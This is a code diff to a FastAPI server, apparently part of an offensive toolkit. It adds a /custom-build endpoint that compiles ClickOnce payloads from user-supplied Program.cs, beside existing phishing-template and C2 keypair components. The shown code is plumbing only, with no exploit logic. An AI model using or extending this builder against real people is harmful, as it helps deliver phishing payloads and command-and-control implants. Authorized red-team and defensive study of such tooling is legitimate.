@@ -11,6 +11,7 @@ from fastapi.responses import HTMLResponse
 
 from src.models import CFCOPayload
 from src.bolthole_models import BoltholePayload, BoltholeC2ConfigRequest
+from src.custom_models import CustomPayload
 from src.bolthole_c2store import (
     load_config, save_config,
     load_keypair, generate_keypair, get_or_generate_keypair, get_fingerprint,
@@ -19,6 +20,7 @@ from src.logging import log_request, GlobalLogger
 from src.consts import BUILD_DIR, PHISH_TEMPLATE_DIR, ALLOWED_PHISH_TEMPLATES
 from src.builder import build_func
 from src.bolthole_builder import bolthole_build_func
+from src.custom_builder import custom_build_func
 
 app = FastAPI(title="CFCO API Server")
 
@@ -50,6 +52,31 @@ async def build(
         os.makedirs(build_dir, exist_ok=True)
 
         background_task.add_task(build_func, buildid, payload)
+
+        return {"buildid": buildid}
+
+    except Exception as e:  # pylint: disable=broad-except
+        GlobalLogger.error("Exception occured as %s", e)
+        GlobalLogger.error("Traceback: %s", traceback.format_exc())
+        raise HTTPException(status_code=500)
+
+
+@app.post("/custom-build")
+@app.post("/api/custom-build")
+async def custom_build(
+    payload: CustomPayload,
+    req: Request,
+    background_task: BackgroundTasks):
+    """Build a custom ClickOnce payload from a user-supplied Program.cs"""
+    try:
+        log_request(req)
+        buildid = _generate_buildid()
+        GlobalLogger.info("Started Custom build #%s", buildid)
+
+        build_dir = os.path.join(BUILD_DIR, buildid)
+        os.makedirs(build_dir, exist_ok=True)
+
+        background_task.add_task(custom_build_func, buildid, payload)
 
         return {"buildid": buildid}
 
